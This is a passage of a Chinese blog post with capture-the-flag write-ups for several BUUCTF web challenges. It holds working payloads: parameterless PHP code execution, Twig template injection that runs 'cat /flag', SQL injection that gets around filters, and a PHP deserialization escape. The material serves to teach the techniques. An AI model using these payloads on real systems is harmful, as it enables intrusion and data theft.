		$result = sprintf(<span class="hljs-string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="hljs-number">1</span>,$username);
	&#125;<span class="hljs-keyword">else</span>&#123;
		$result = sprintf(<span class="hljs-string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="hljs-number">0</span>,$username);
	&#125;	
&#125;<span class="hljs-keyword">catch</span>(<span class="hljs-keyword">Exception</span> $e)&#123;
	$result = sprintf(<span class="hljs-string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="hljs-number">3</span>,$e-&gt;getMessage());
&#125;

header(<span class="hljs-string">'Content-Type: text/html; charset=utf-8'</span>);
<span class="hljs-keyword">echo</span> $result;
<span class="hljs-meta">?&gt;</span></code></pre></div>



<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>.git源码泄露</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">"flag.php"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"flag在哪里呢？&lt;br&gt;"</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'exp'</span>]))&#123;
    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="hljs-string">'exp'</span>])) &#123;
        <span class="hljs-keyword">if</span>(<span class="hljs-string">';'</span> === preg_replace(<span class="hljs-string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="hljs-keyword">NULL</span>, $_GET[<span class="hljs-string">'exp'</span>])) &#123;
            <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="hljs-string">'exp'</span>])) &#123;
                <span class="hljs-comment">// echo $_GET['exp'];</span>
                @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">'exp'</span>]);
            &#125;
            <span class="hljs-keyword">else</span>&#123;
                <span class="hljs-keyword">die</span>(<span class="hljs-string">"还差一点哦！"</span>);
            &#125;
        &#125;
        <span class="hljs-keyword">else</span>&#123;
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"再好好想想！"</span>);
        &#125;
    &#125;
    <span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"还想读flag，臭弟弟！"</span>);
    &#125;
&#125;
<span class="hljs-comment">// highlight_file(__FILE__);</span>
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>第一个<code>if</code>：常用的伪协议被禁了</p>
<p>第二个<code>if</code>正则匹配，<code>?R</code> 表示引用当前表达式，就比如引用一次：<br><code>[a-z,_]+[a-z,_]+\((?R)?\)</code>，所以一个合法的表达式可以是<code>a(b();)</code>，括号和字符组成的</p>
<p>第三个<code>if</code>就过滤一些函数包含的字符，导致了许多函数无法使用。</p>
<blockquote>
<p>1.需要以GET形式传入一个名为exp的参数。如果满足条件会执行这个exp参数的内容。 </p>
<p>2.过滤了常用的几个伪协议，不能以伪协议读取文件。 </p>
<p>3.(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。 </p>
<p>4.正则匹配掉了et/na/info等关键字，很多函数都用不了。</p>
<p> 5：eval($_GET[‘exp’]); </p>
</blockquote>
<p>考察点无参RCE</p>
<p>exp：</p>
<div class="hljs"><pre><code class="hljs reasonml">?exp=highlight<span class="hljs-constructor">_file(<span class="hljs-params">next</span>(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>)))));</code></pre></div>

<p>这里用到反转函数是因为，flag.php在倒数第二个位置，无法使用end()获取，反转后可以直接受用next()获取，方便很多。</p>
<p><strong>localeconv()</strong> 函数返回一包含本地数字及货币格式信息的数组。</p>
<p><strong>current()</strong> 函数返回数组中的当前元素的值。</p>
<blockquote>
<p>每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</p>
<p><strong>提示：</strong>该函数不会移动数组内部指针。要做到这一点，请使用 <a href="https://www.w3school.com.cn/php/func_array_krsort.asp" target="_blank" rel="noopener">next()</a> 和 <a href="https://www.w3school.com.cn/php/func_array_krsort.asp" target="_blank" rel="noopener">prev()</a> 函数。</p>
<p>相关的方法：</p>
<ul>
<li><a href="https://www.w3school.com.cn/php/func_array_end.asp" target="_blank" rel="noopener">end()</a> - 将内部指针指向数组中的最后一个元素，并输出</li>
<li><a href="https://www.w3school.com.cn/php/func_array_next.asp" target="_blank" rel="noopener">next()</a> - 将内部指针指向数组中的下一个元素，并输出</li>
<li><a href="https://www.w3school.com.cn/php/func_array_prev.asp" target="_blank" rel="noopener">prev()</a> - 将内部指针指向数组中的上一个元素，并输出</li>
<li><a href="https://www.w3school.com.cn/php/func_array_reset.asp" target="_blank" rel="noopener">reset()</a> - 将内部指针指向数组中的第一个元素，并输出</li>
<li><a href="https://www.w3school.com.cn/php/func_array_each.asp" target="_blank" rel="noopener">each()</a> - 返回当前元素的键名和键值，并将内部指针向前移动</li>
</ul>
</blockquote>
<p><strong>array_reverse()</strong> 函数以相反的元素顺序返回数组。</p>
<p>array_reverse() 函数将原数组中的元素顺序翻转，创建新的数组并返回。</p>
<p>如果第二个参数指定为 true，则元素的键名保持不变，否则键名将丢失。</p>
<p><a href="https://www.w3school.com.cn/php/func_array_reverse.asp" target="_blank" rel="noopener">详情</a></p>
<p><strong>array_flip()</strong> 函数用于反转/交换数组中所有的键名以及它们关联的键值。</p>
<p>array_flip() 函数返回一个反转后的数组，如果同一值出现了多次，则最后一个键名将作为它的值，所有其他的键名都将丢失。</p>
<p>如果原数组中的值的数据类型不是字符串或整数，函数将报错。</p>
<h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>首先再hint.php中发现了提示</p>
<p><img src="https://i.loli.net/2020/12/16/uw4fMRbPYv2oHti.png" srcset="/img/loading.gif" alt="image-20201216083026655"></p>
<p>于是抓包看看cookie是啥，在flag.php页面随便登录后cookie后半段的值为用户名，尝试了sql注入，命令执行，都不是，于是试试了模板注入</p>
<p>user={{2*4}}，出现下图的样子，说明了括号中的表达式被执行了，所以确定是模板注入</p>
<p><img src="https://i.loli.net/2020/12/16/8irHUQKcXDZYMWv.png" srcset="/img/loading.gif" alt="image-20201216082222224"></p>
<p>下面就是要找到读取flag的payload</p>
<p>在网上找到了一个将模板注入说的很详细的博客，<a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig" target="_blank" rel="noopener">传送门</a></p>
<p>下面需要判断这个题目是哪个类型的模板，结合下面的图片做测试</p>
<p><img src="https://i.loli.net/2020/12/16/GQid7jrR562I8te.png" srcset="/img/loading.gif" alt="image-20201216085015609"></p>
<p><img src="https://i.loli.net/2020/12/16/9SZY8zLwvtDeiyT.png" srcset="/img/loading.gif" alt="image-20201216084914194"></p>
<div class="hljs"><pre><code class="hljs angelscript">user=admin&#123;&#123;<span class="hljs-number">1</span>*<span class="hljs-number">2</span>&#125;&#125;*&#123;&#123;<span class="hljs-number">2</span>*<span class="hljs-number">3</span>&#125;&#125;</code></pre></div>

<p>结果回显的是hellow admin2*6，正好是上面图片的第一种情况，所以就是Twig模板</p>
<p>找到payload：</p>
<div class="hljs"><pre><code class="hljs clojure">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="hljs-string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="hljs-string">"cat /flag"</span>)&#125;&#125;</code></pre></div>



<p><img src="https://i.loli.net/2020/12/16/3TSMP4x7K5ujoYA.png" srcset="/img/loading.gif" alt="image-20201216084621589"></p>
<p>参考:<a href="https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之SSTI漏洞/#2-Twig" target="_blank" rel="noopener">一篇文章带你理解漏洞之 SSTI 漏洞 | K0rz3n’s Blog</a></p>
<h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>注册账号登录后，可以申请发布广告，在这个页面可以发现存在一个xxs，但是好像没法直接利用</p>
<p><img src="/2020/10/08/buuoj-z7z8/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201216094058451.png" srcset="/img/loading.gif" alt="image-20201216094058451"></p>
<p>测试是否存在sql注入</p>
<p>在申请广告是输入标题<code>1&#39;111</code>，提交正常，但是当查看广告详情的时候出现了报错页面，这也说明了存在sql注入,而且是二次注入</p>
<p><img src="/2020/10/08/buuoj-z7z8/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201216094728350.png" srcset="/img/loading.gif" alt="image-20201216094728350"></p>
<h3 id="0x1sql注入"><a href="#0x1sql注入" class="headerlink" title="0x1sql注入"></a>0x1sql注入</h3><p>查看列数，空格是被加入了黑名单，使用/**/代替空格，一直加到了22才出现回显。</p>
<div class="hljs"><pre><code class="hljs lsl"><span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span><span class="hljs-comment">/**/</span>'</code></pre></div>

<p><img src="https://i.loli.net/2020/12/16/YLCR8ODt2wiSWfZ.png" srcset="/img/loading.gif" alt="image-20201216095035895"></p>
<p>接下来就是查询库名，直接使用常规的查询方法会发现存在waf，无法使用，猜测可能是过滤or这个关键词，导致了information也被过滤了，那就换另外一种方法</p>
<div class="hljs"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">table_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>sys.schema_auto_increment_colum
ns<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-keyword">schema</span>()</code></pre></div>

<p>最后找到 了这个方法</p>
<div class="hljs"><pre><code class="hljs lsl"><span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(select<span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>mysql.innodb_table_stats),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span><span class="hljs-comment">/**/</span>'</code></pre></div>

<p><img src="https://i.loli.net/2020/12/16/1e7KM9aCEkoI4GS.png" srcset="/img/loading.gif" alt="image-20201216101152422"></p>
<p>接下来就是获取列名，但是常规的方法还是不能用，应为还是存在information</p>
<p>那就使用一种新的查询方法，无列名查询</p>
<p>刚开始以为flag放在FLAG_TABLE中，但是提示不存在这个表，又试了试users表，在第三列读到了flag</p>
<p><img src="https://i.loli.net/2020/12/16/KiPL3omEjIanDcl.png" srcset="/img/loading.gif" alt="image-20201216103008504"></p>
<p>一开始以为users表的结构是两列，但是注入时会报错，说明不是两列，测试三列时就正常了，说明时三列</p>
<p><img src="https://i.loli.net/2020/12/16/Hm7NBTF32ED5gp4.png" srcset="/img/loading.gif" alt="image-20201216103553070"></p>
<p>查到第三列的时候看到了flag,payload如下</p>
<div class="hljs"><pre><code class="hljs lsl"><span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(select<span class="hljs-comment">/**/</span>group_concat(a)<span class="hljs-comment">/**/</span>from(select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">/**/</span>as<span class="hljs-comment">/**/</span>a<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>users)b),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span><span class="hljs-comment">/**/</span>'</code></pre></div>



<p>参考：<a href="https://www.jianshu.com/p/dc9af4ca2d06" target="_blank" rel="noopener">https://www.jianshu.com/p/dc9af4ca2d06</a></p>
<h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

$function = @$_GET[<span class="hljs-string">'f'</span>];

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($img)</span></span>&#123;
    $filter_arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">'php'</span>,<span class="hljs-string">'flag'</span>,<span class="hljs-string">'php5'</span>,<span class="hljs-string">'php4'</span>,<span class="hljs-string">'fl1g'</span>);
    $filter = <span class="hljs-string">'/'</span>.implode(<span class="hljs-string">'|'</span>,$filter_arr).<span class="hljs-string">'/i'</span>;
    <span class="hljs-keyword">return</span> preg_replace($filter,<span class="hljs-string">''</span>,$img);
&#125;

<span class="hljs-keyword">if</span>($_SESSION)&#123;
    <span class="hljs-keyword">unset</span>($_SESSION);
&#125;
$_SESSION[<span class="hljs-string">"user"</span>] = <span class="hljs-string">'guest'</span>;
$_SESSION[<span class="hljs-string">'function'</span>] = $function;
extract($_POST);

<span class="hljs-keyword">if</span>(!$function)&#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;
&#125;

<span class="hljs-keyword">if</span>(!$_GET[<span class="hljs-string">'img_path'</span>])&#123;
    $_SESSION[<span class="hljs-string">'img'</span>] = base64_encode(<span class="hljs-string">'guest_img.png'</span>);
&#125;<span class="hljs-keyword">else</span>&#123;
    $_SESSION[<span class="hljs-string">'img'</span>] = sha1(base64_encode($_GET[<span class="hljs-string">'img_path'</span>]));
&#125;

$serialize_info = filter(serialize($_SESSION));

<span class="hljs-keyword">if</span>($function == <span class="hljs-string">'highlight_file'</span>)&#123;
    highlight_file(<span class="hljs-string">'index.php'</span>);
&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($function == <span class="hljs-string">'phpinfo'</span>)&#123;
    <span class="hljs-keyword">eval</span>(<span class="hljs-string">'phpinfo();'</span>); <span class="hljs-comment">//maybe you can find something in here!</span>
&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($function == <span class="hljs-string">'show_image'</span>)&#123;
    $userinfo = unserialize($serialize_info);
    <span class="hljs-keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="hljs-string">'img'</span>]));
&#125;</code></pre></div>

<p>第33行代码提示了phpinfo中有隐藏的东西，GET提交<code>f=phpinfo</code>，会在里面找到一个文件的名字<strong>d0g3_f1ag.php</strong></p>
<p>那么接下来的目的就是通过一些方法读取到里面的信息。可以看到最后一行存在一个 file_get_content函数，结合题目标题，可以猜到是反序列化加文件读取的题目。</p>
<h3 id="0x1代码审计"><a href="#0x1代码审计" class="headerlink" title="0x1代码审计"></a>0x1代码审计</h3><p>代码最后一行有一个<code>file_get_contents</code>是能够读取文件的函数，他这里读取的是base64解密的’img’,往前找这个’img’，可以发现如果我们有传入img_path，它会经过sha1加密，导致目标路径失效。如果我们没有传入img_path，那么后台将默认赋值为guest_img.png的base64编码。这样看来这个<code>$userinfo[&#39;img&#39;]</code>并不是我们可控的，此时需要把注意力转移到另外一个函数serialize上，这里有一个很明显的漏洞点，数据经过序列化了之后又经过了一层过滤函数，就是数组里提到的<code>&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;</code>都会被空格替代，而这层过滤函数会干扰序列化后的数据。</p>
<h3 id="0x2php反序列化字符逃逸"><a href="#0x2php反序列化字符逃逸" class="headerlink" title="0x2php反序列化字符逃逸"></a>0x2php反序列化字符逃逸</h3><p>利用过滤函数而导致序列化结果产生新的结果，之前写过类似的<a href="https://sunzy.icu/2020/11/17/UNCTF/" target="_blank" rel="noopener">文章</a></p>
<p><img src="https://i.loli.net/2020/12/20/37JhPXH6GqbeuSI.png" srcset="/img/loading.gif" alt="image-20201220213459548"></p>
<p>这里重新构造出的序列化值为：</p>
<div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"user"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">24</span>:<span class="hljs-string">""</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">"function"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">59</span>:<span class="hljs-string">"a"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">"img"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">20</span>:<span class="hljs-string">"ZDBnM19mMWFnLnBocA=="</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">2</span>:<span class="hljs-string">"dd"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">1</span>:<span class="hljs-string">"a"</span>;&#125;</code></pre></div>

<p>可以看到 真正的<code>$_SESSION[&quot;img&quot;]=&#39;L2QwZzNfZmxsbGxsbGFn&#39;;</code> 被抛弃掉了。这是因为我们在构造这段字符时是设计好长度的，<code>s:2:&quot;dd&quot;;s:1:&quot;a&quot;;}</code>，这里的 } 与之前的 { 闭合，让反序列提前结束，从而看到反序列化的内容为</p>
<div class="hljs"><pre><code class="hljs cs">[<span class="hljs-meta"><span class="hljs-meta-string">"user"</span></span>]=&gt;
<span class="hljs-keyword">string</span>(<span class="hljs-number">24</span>) <span class="hljs-string">""</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">"function"</span>;s:<span class="hljs-number">59</span>:<span class="hljs-string">"a"</span>
[<span class="hljs-meta"><span class="hljs-meta-string">"img"</span></span>]=&gt;
<span class="hljs-keyword">string</span>(<span class="hljs-number">20</span>) <span class="hljs-string">"ZDBnM19mMWFnLnBocA=="</span>
[<span class="hljs-meta"><span class="hljs-meta-string">"dd"</span></span>]=&gt;
<span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">"a"</span></code></pre></div>

<p>根据上面的构造方法，那么就可以将img字段的值改为phpinfo中给的文件名的base64值，从而读取其内容</p>
<p>构造payload</p>
<div class="hljs"><pre><code class="hljs php">get:f=show_image
post:_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="hljs-function"><span class="hljs-keyword">function</span>]=<span class="hljs-title">a</span>"</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">"img"</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">"ZDBnM19mMWFnLnBocA=="</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">"dd"</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">"a"</span>;&#125;</code></pre></div>

<p><img src="https://i.loli.net/2020/12/20/ESz2xIZWJD8j7Rk.png" srcset="/img/loading.gif" alt="image-20201220213803529"></p>
<p>提示了flag在这个文件中，那就将上面的img字段值换成这个文件名的base64值</p>
<div class="hljs"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">base64</span><span class="hljs-params">(/d0g3_fllllllag)</span></span> = L2QwZzNfZmxsbGxsbGFn</code></pre></div>

<p>payload:</p>
<div class="hljs"><pre><code class="hljs pgsql"><span class="hljs-keyword">get</span>:f=show_image		post:_SESSION[<span class="hljs-keyword">user</span>]=flagflagflagflagflagflag&amp;_SESSION[<span class="hljs-keyword">function</span>]=a";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";s:2:"dd";s:1:"a";&#125;</code></pre></div>


            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/md5/">md5</a>
                    
                      <a class="hover-with-bg" href="/tags/ssrf/">ssrf</a>
                    
                      <a class="hover-with-bg" href="/tags/system/">system</a>
                    
                      <a class="hover-with-bg" href="/tags/unserialize/">unserialize</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2020/10/08/buuoj-upload/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">buuctf-upload</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2020/10/05/buuoj/">
                        <span class="hidden-mobile">buuctf-sql注入</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments">
                
                
  <div id="vcomments"></div>
  <script type="text/javascript">
    function loadValine() {
      addScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js', function () {
        new Valine({
          el: "#vcomments",
          app_id: "2rPljbm5WOxA9BCPXqy3VE5y-gzGzoHsz",
          app_key: "SCoIn2Qp99a7ITtPhkAi6Chw",
          placeholder: "说点什么吧~~~",
          path: window.location.pathname,
          avatar: "retro",
          meta: ["nick","mail","link"],
          pageSize: "10",
          lang: "zh-CN",
          highlight: true,
          recordIP: false,
          serverURLs: "",
          master: "4cd096660a71d786a2a4d9d0bb4e8996",
          friends: "b275f0fc8103331da645a878cf60f841",
          tagMeta: ["博主","友人","访客"],
        });
      });
    }
    waitElementVisible('vcomments', loadValine);
  </script>
  <noscript>Please enable JavaScript to view the <a href="https://valine.js.org" target="_blank" rel="nofollow noopener noopener">comments
      powered by Valine.</a></noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->

  <div class="col-lg-7 mx-auto nopadding-md">
    <div class="container custom post-content mx-auto">
      <img src="https://octodex.github.com/images/jetpacktocat.png" srcset="/img/loading.gif" class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;">
    </div>
  </div>


    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/main.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
  <script  src="/js/clipboard-use.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "buuctf-z7z8&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: true,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
      icon: "§"
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>












  

  

  

  

  

  



<div class="text-center py-1">   
  <div>
    <span>Copyright © 2020</span></a>
    <a href="http://sunzy.icu/" target="_blank" rel="nofollow noopener">
     <span>my blog</span></a>    <br>
  </div>
<div>
  <span id="timeDate">载入天数...</span>
  <span id="times">载入时分秒...</span>
  <script>
